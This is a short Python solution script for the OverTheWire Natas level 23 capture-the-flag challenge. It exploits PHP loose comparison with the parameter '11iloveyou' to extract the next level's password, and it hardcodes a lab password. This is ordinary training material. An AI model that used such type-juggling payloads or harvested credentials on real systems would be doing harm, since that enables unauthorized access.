import requests

import natas22
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "OsRmXFguozKpTZZ5X14zNO43379LZveg"
    url = "http://natas23.natas.labs.overthewire.org"
    username = "natas23"
    if not password:
        password = natas22.solution(cheat=True)

    # From the source code:
    # if(array_key_exists("passwd",$_REQUEST)){
    #     if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
    #         echo "<br>The credentials for the next level are:<br>";
    #         echo "<pre>Username: natas24 Password: <censored></pre>";
    #     }
    #     else{
    #         echo "<br>Wrong!<br>";
    #     }
    # }
    #
    # From the PHP documentation:
    # When a string is evaluated in a numeric context, the resulting value
    # and type are determined as follows.
    # If the string does not contain any of the characters '.', 'e', or 'E'
    # and the numeric value fits into integer type limits (as defined by
    # PHP_INT_MAX), the string will be evaluated as an integer. In all other
    # cases it will be evaluated as a float.

    auth = (username, password)
    params = {"passwd": "11iloveyou"}
    r = requests.get(url, auth=auth, params=params)
    start = "Password: "
    end = "</pre>"
    natas24_password = between(r.text, start, end)
    return natas24_password
